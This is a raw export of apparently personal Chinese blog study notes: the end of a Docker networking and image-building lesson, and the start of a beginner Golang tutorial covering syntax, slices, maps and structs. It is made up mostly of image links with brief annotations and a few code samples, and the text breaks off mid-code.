href="#解决主机到容器以及容器之间互相访问" class="headerlink" title="解决主机到容器以及容器之间互相访问"></a>解决主机到容器以及容器之间互相访问</h3><p>其中Bridge是默认情况<br>Host不能端口复用<br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/59.png"></p><h3 id="跨主机访问"><a href="#跨主机访问" class="headerlink" title="跨主机访问"></a>跨主机访问</h3><p><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/60.png"></p><h3 id="Nul模式"><a href="#Nul模式" class="headerlink" title="Nul模式"></a>Nul模式</h3><p><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/61.png"></p><h3 id="默认模式-网桥和-NAT"><a href="#默认模式-网桥和-NAT" class="headerlink" title="默认模式-网桥和 NAT"></a>默认模式-网桥和 NAT</h3><p>veth读 歪斯派尔<br>下面这两个容器链接在同一个网桥上<br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/62.png"><br>通过<code>brctl show</code>就能看到docker0<br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/63.png"><br>其中<code>-p</code>指的是一个映射，指的是把主机的8888端口映射成容器的80端口<br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/64.png"></p><h3 id="Nul模式实现"><a href="#Nul模式实现" class="headerlink" title="Nul模式实现"></a>Nul模式实现</h3><p>给一个容器建网络首先要把network space建出来<br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/65.png"><br>把这两个连接起来以便在list中显示<br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/66.png"><br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/67.png"><br>a口链接docker0<br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/68.png"><br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/69.png"><br>b口链接<br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/70.png"><br>查看配置<br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/71.png"><br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/72.png"><br>再次查看配置情况<br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/73.png"><br>curl一下<br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/74.png"></p><h3 id="Underlay"><a href="#Underlay" class="headerlink" title="Underlay"></a>Underlay</h3><p>用一个网桥链接物理网络，主机网卡和容器网卡都走这个网桥<br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/75.png"></p><h3 id="Overlay-network-sample-Flannel"><a href="#Overlay-network-sample-Flannel" class="headerlink" title="Overlay network sample - Flannel"></a>Overlay network sample - Flannel</h3><p>隧道技术：容器包上面再加一层，到了再解包<br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/76.png"><br>任何数据出去都被flanneld封一层<br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/77.png"></p><h4 id="Flannel-packet-sample"><a href="#Flannel-packet-sample" class="headerlink" title="Flannel packet sample"></a>Flannel packet sample</h4><p><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/78.png"></p><h2 id="创建-docker-镜像"><a href="#创建-docker-镜像" class="headerlink" title="创建 docker 镜像"></a>创建 docker 镜像</h2><p><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/79.png"></p><h3 id="回顾12-Factor-之进程"><a href="#回顾12-Factor-之进程" class="headerlink" title="回顾12 Factor 之进程"></a>回顾12 Factor 之进程</h3><p><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/80.png"></p><h3 id="理解构建上下文-Build-Context"><a href="#理解构建上下文-Build-Context" class="headerlink" title="理解构建上下文(Build Context)"></a>理解构建上下文(Build Context)</h3><p>docker build的时候会把当前目录里的所有文件都发给docker demon<br>所以千万不要在根目录build<br>对于下面这种指令，目录必须在上下文环境里才行<br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/81.png"><br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/82.png"></p><h3 id="镜像构建日志"><a href="#镜像构建日志" class="headerlink" title="镜像构建日志"></a>镜像构建日志</h3><p><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/83.png"></p><h3 id="Build-Cache"><a href="#Build-Cache" class="headerlink" title="Build Cache"></a>Build Cache</h3><p>越稳定的放在下面，变动多的放在上面<br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/84.png"></p><h3 id="多段构建-Multi-stage-build"><a href="#多段构建-Multi-stage-build" class="headerlink" title="多段构建(Multi-stage build)"></a>多段构建(Multi-stage build)</h3><p>最后直打包了个二进制文件<br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/85.png"></p><h3 id="Dockerfile-常用指令"><a href="#Dockerfile-常用指令" class="headerlink" title="Dockerfile 常用指令"></a>Dockerfile 常用指令</h3><p>FROM scratch就是空的，出现问题只能登主机去看<br>LABEL 方便查询</p><p><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/86.png"><br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/87.png"><br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/88.png"><br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/89.png"><br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/90.png"><br>容器的运维是面向应用的运维而不是操作系统的运维<br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/91.png"></p><h3 id="Dockerfile-最佳实践"><a href="#Dockerfile-最佳实践" class="headerlink" title="Dockerfile 最佳实践"></a>Dockerfile 最佳实践</h3><p><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/92.png"></p><h3 id="多进程的容器镜像"><a href="#多进程的容器镜像" class="headerlink" title="多进程的容器镜像"></a>多进程的容器镜像</h3><p>需要多个进程并行可以用tini作为初始化进程<br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/93.png"></p><h3 id="Docker-镜像管理"><a href="#Docker-镜像管理" class="headerlink" title="Docker 镜像管理"></a>Docker 镜像管理</h3><p><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/94.png"></p><h3 id="基于-Docker-镜像的版本管理"><a href="#基于-Docker-镜像的版本管理" class="headerlink" title="基于 Docker 镜像的版本管理"></a>基于 Docker 镜像的版本管理</h3><p><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/95.png"></p><h3 id="Docker-tag-与-github-的版本管理合力"><a href="#Docker-tag-与-github-的版本管理合力" class="headerlink" title="Docker tag 与 github 的版本管理合力"></a>Docker tag 与 github 的版本管理合力</h3><p><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/96.png"></p><h3 id="镜像仓库"><a href="#镜像仓库" class="headerlink" title="镜像仓库"></a>镜像仓库</h3><p><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/97.png"></p><h3 id="Docker优势"><a href="#Docker优势" class="headerlink" title="Docker优势"></a>Docker优势</h3><p><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/98.png"></p><h3 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h3><p><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/99.png"><br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/100.png"></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/101.png"></p>]]></content>
      
      
      <categories>
          
          <category> 技术栈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang简易教程</title>
      <link href="/2022/03/12/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/"/>
      <url>/2022/03/12/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="为什么需要go"><a href="#为什么需要go" class="headerlink" title="为什么需要go"></a>为什么需要go</h2><ul><li><p>编译高效</p></li><li><p>支持高并发</p></li><li><p>面向垃圾回收</p><h3 id="删繁就简"><a href="#删繁就简" class="headerlink" title="删繁就简"></a>删繁就简</h3></li><li><p>不支持函数重载</p></li><li><p>不支持隐式转换</p></li><li><p>不支持继承</p></li><li><p>不支持动态链接库</p></li><li><p>不支持动态加载代码</p></li><li><p>通过recover和panic替代异常机制</p></li><li><p>不支持断言</p></li><li><p>不支持静态变量</p><h3 id="go语言特性来源"><a href="#go语言特性来源" class="headerlink" title="go语言特性来源"></a>go语言特性来源</h3><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/0.png"></p><h2 id="配置go"><a href="#配置go" class="headerlink" title="配置go"></a>配置go</h2><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/1.png"><br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/2.png"></p><h3 id="windows下环境变量"><a href="#windows下环境变量" class="headerlink" title="windows下环境变量"></a>windows下环境变量</h3><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/3.png"><br>path下添加<br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/4.png"><br>Goland中添加代理<br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/5.png"></p><h3 id="GoLand生成可执行文件"><a href="#GoLand生成可执行文件" class="headerlink" title="GoLand生成可执行文件"></a>GoLand生成可执行文件</h3><p>打开运行设置<br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/6.png"></p></li></ul><p>新建一个go build<br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/7.png"></p><p>新增一个设置，命名为“build windows”，赋值如图<br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/8.png"><br>其中最重要的是Environment<br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/9.png"></p><p>选择正确的配置，开始编译（运行）<br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/10.png"></p><p>会直接生成exe<br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/11.png"></p><p>双击可以直接运行<br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/12.png"></p><p>如果是想编译为linux可用的，配置如下（注意有三个变动，首先指定一个新的输出目录，其次要反选掉Checkbox，因为我们是windows平台，编译完无法直接执行，再次要指定GOOS为linux）<br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/13.png"></p><p>输出如下<br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/14.png"></p><p>上传到服务器<br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/15.png"></p><p>改权限后可以运行<br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/16.png"></p><h3 id="一些基本命令"><a href="#一些基本命令" class="headerlink" title="一些基本命令"></a>一些基本命令</h3><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/17.png"><br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/18.png"></p><h4 id="go-test"><a href="#go-test" class="headerlink" title="go test"></a>go test</h4><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/19.png"></p><h4 id="go-vet"><a href="#go-vet" class="headerlink" title="go vet"></a>go vet</h4><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/20.png"></p><h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><h3 id="if"><a href="#if" class="headerlink" title="if"></a>if</h3><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/21.png"></p><h3 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h3><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/22.png"><br>每个switch默认带一个break</p><h3 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h3><p>go中没有while循环<br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/23.png"></p><h4 id="for-range"><a href="#for-range" class="headerlink" title="for-range"></a>for-range</h4><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/24.png"><br>这个和python类似</p><h3 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;flag&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">name := flag.String(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;world&quot;</span>, <span class="string">&quot;specify the name you want to say hi&quot;</span>)</span><br><span class="line">flag.Parse()</span><br><span class="line">fmt.Println(<span class="string">&quot;os args is:&quot;</span>, os.Args)</span><br><span class="line">fmt.Println(<span class="string">&quot;input parameter is:&quot;</span>, *name)</span><br><span class="line">fullString := fmt.Sprintf(<span class="string">&quot;Hello %s from Go\n&quot;</span>, *name)</span><br><span class="line">fmt.Println(fullString)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>go run ./main --name myname</code>的意思是把参数名为name的参数myname传给os.Args<br>flag.String()用于定义一个字符串的具有指定名称、默认值和用法字符串的字符串标志。返回值是存储标志值的字符串变量的地址。<br>flag.Parse()用于定义在接收参数之前。</p><h2 id="变量定义"><a href="#变量定义" class="headerlink" title="变量定义"></a>变量定义</h2><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/25.png"><br><strong>：=结构不能在函数外使用</strong></p><h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><p>go不存在隐式转换，因为隐式转换容易出错<br>所以必须强制转换<br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/26.png"></p><h2 id="数组和切片"><a href="#数组和切片" class="headerlink" title="数组和切片"></a>数组和切片</h2><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/27.png"><br>切片类似于动态数组<br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/28.png"></p><h3 id="切片添加元素"><a href="#切片添加元素" class="headerlink" title="切片添加元素"></a>切片添加元素</h3><p><code>mySLice1 = append (mySlice, 1)</code></p><h3 id="切片删除元素"><a href="#切片删除元素" class="headerlink" title="切片删除元素"></a>切片删除元素</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">deleteltem</span><span class="params">(slice []<span class="keyword">int</span>, index <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">append</span>(slice[:index], slicelindex+<span class="number">1</span>:]...)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="构造切片"><a href="#构造切片" class="headerlink" title="构造切片"></a>构造切片</h3><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/29.png"></p><h3 id="关于切片的常见问题"><a href="#关于切片的常见问题" class="headerlink" title="关于切片的常见问题"></a>关于切片的常见问题</h3><p>纠正： a := []int{}<br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/30.png"><br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/31.png"><br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/32.png"><br>b原来的空间满了，导致c和a指向不同空间<br>=&gt;不要append b再赋给a，直接赋给b自己<br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/33.png"><br>修改变量value不会改变切片里的值<br><strong>go语言里全部都是值传递</strong></p><h2 id="fmt包的printf-方法"><a href="#fmt包的printf-方法" class="headerlink" title="fmt包的printf()方法"></a>fmt包的printf()方法</h2><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>fmt 包实现了格式化 I/O 函数，类似于 C 的 printf 和 scanf。格式“占位符”衍生自 C，但比 C 更简单。<br>[打印]<br>占位符：</p><h4 id="一般"><a href="#一般" class="headerlink" title="一般"></a>一般</h4><p>%v 相应值的默认格式。在打印结构体时，“加号”标记（%+v）会添加字段名<br>%#v 相应值的 Go 语法表示<br>%T 相应值的类型的 Go 语法表示<br>%% 字面上的百分号，并非值的占位符<br>[布尔]<br>%t 单词 true 或 false。</p><h4 id="整数"><a href="#整数" class="headerlink" title="整数"></a>整数</h4><p>%b 二进制表示<br>%c 相应 Unicode 码点所表示的字符<br>%d 十进制表示<br>%o 八进制表示<br>%q 单引号围绕的字符字面值，由 Go 语法安全地转义<br>%x 十六进制表示，字母形式为小写 a-f<br>%X 十六进制表示，字母形式为大写 A-F<br>%U Unicode 格式：U+1234，等同于 “U+%04X”</p><h4 id="浮点数及其复合构成"><a href="#浮点数及其复合构成" class="headerlink" title="浮点数及其复合构成"></a>浮点数及其复合构成</h4><p>%b 无小数部分的，指数为二的幂的科学计数法，与 strconv.FormatFloat 的 ‘b’ 转换格式一致。例如 -123456p-78<br>%e 科学计数法，例如 -1234.456e+78<br>%E 科学计数法，例如 -1234.456E+78<br>%f 有小数点而无指数，例如 123.456<br>%g 根据情况选择 %e 或 %f 以产生更紧凑的（无末尾的 0）输出<br>%G 根据情况选择 %E 或 %f 以产生更紧凑的（无末尾的 0）输出</p><h4 id="字符串与字节切片"><a href="#字符串与字节切片" class="headerlink" title="字符串与字节切片"></a>字符串与字节切片</h4><p>%s 字符串或切片的无解译字节<br>%q 双引号围绕的字符串，由 Go 语法安全地转义<br>%x 十六进制，小写字母，每字节两个字符<br>%X 十六进制，大写字母，每字节两个字符</p><h4 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h4><p>%p 十六进制表示，前缀 0x</p><h2 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h2><p>map的value可以是一个函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">myMap := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>, <span class="number">10</span>)</span><br><span class="line">myMap[<span class="string">&quot;a&quot;</span>] = <span class="string">&quot;b&quot;</span></span><br><span class="line">myFuncMap := <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="function"><span class="keyword">func</span><span class="params">()</span> <span class="title">int</span></span>&#123;</span><br><span class="line"><span class="string">&quot;funcA&quot;</span>: <span class="function"><span class="keyword">func</span><span class="params">()</span> <span class="title">int</span></span> &#123; <span class="keyword">return</span> <span class="number">1</span> &#125;,</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(myFuncMap)</span><br><span class="line">f := myFuncMap[<span class="string">&quot;funcA&quot;</span>]</span><br><span class="line">fmt.Println(f())</span><br><span class="line">value, exists := myMap[<span class="string">&quot;a&quot;</span>]</span><br><span class="line"><span class="keyword">if</span> exists &#123;</span><br><span class="line"><span class="built_in">println</span>(value)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> k, v := <span class="keyword">range</span> myMap &#123;</span><br><span class="line"><span class="built_in">println</span>(k, v)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="结构体和接口"><a href="#结构体和接口" class="headerlink" title="结构体和接口"></a>结构体和接口</h2><p>结构体里只能有属性<br>接口里只能有方法<br>new一个结构体获得的是一个指针变量</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> IF <span class="keyword">interface</span> &#123;</span><br><span class="line">getName() <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Human <span class="keyword">struct</span> &#123;</span><br><span class="line">firstName, lastName <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">h := <span class="built_in">new</span>(Human)</span><br></pre></td></tr></table></figure><h3 id="结构体和标签"><a href="#结构体和标签" class="headerlink" title="结构体和标签"></a>结构体和标签</h3><p>k8s中标签很常见<br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/34.png"></p><h3 id="类型重命名"><a href="#类型重命名" class="headerlink" title="类型重命名"></a>类型重命名</h3><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/35.png"></p><h2 id="Main函数"><a href="#Main函数" class="headerlink" title="Main函数"></a>Main函数</h2><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/36.png"></p><h2 id="参数解析"><a href="#参数解析" class="headerlink" title="参数解析"></a>参数解析</h2><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/37.png"></p><h2 id="Init函数"><a href="#Init函数" class="headerlink" title="Init函数"></a>Init函数</h2><p>只会运行一次<br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/38.png"><br>早期kubernetes中因为重复调用依赖会出现重复flag的问题<br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/39.png"></p><h2 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h2><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/40.png"></p><h2 id="error"><a href="#error" class="headerlink" title="error"></a>error</h2><p>以下两种写法是等价的<br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/41.png"><br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/42.png"></p><h2 id="传递变长参数"><a href="#传递变长参数" class="headerlink" title="传递变长参数"></a>传递变长参数</h2><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/43.png"></p><h2 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h2><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/44.png"></p><h2 id="回调函数-Callback"><a href="#回调函数-Callback" class="headerlink" title="回调函数(Callback)"></a>回调函数(Callback)</h2><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/45.png"></p><h2 id="闭包-匿名函数"><a href="#闭包-匿名函数" class="headerlink" title="闭包(匿名函数)"></a>闭包(匿名函数)</h2><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/46.png"></p><h2 id="方法-成员函数"><a href="#方法-成员函数" class="headerlink" title="方法(成员函数)"></a>方法(成员函数)</h2><p>普通函数使用时需要包名+函数名来调用<br>方法的话需要接受者名+方法名来调用<br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/47.png"></p><h2 id="传值还是传指针"><a href="#传值还是传指针" class="headerlink" title="传值还是传指针"></a>传值还是传指针</h2><p>每个参数都相当于是复制了一份再传进去<br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/48.png"></p><h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/49.png"></p><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span 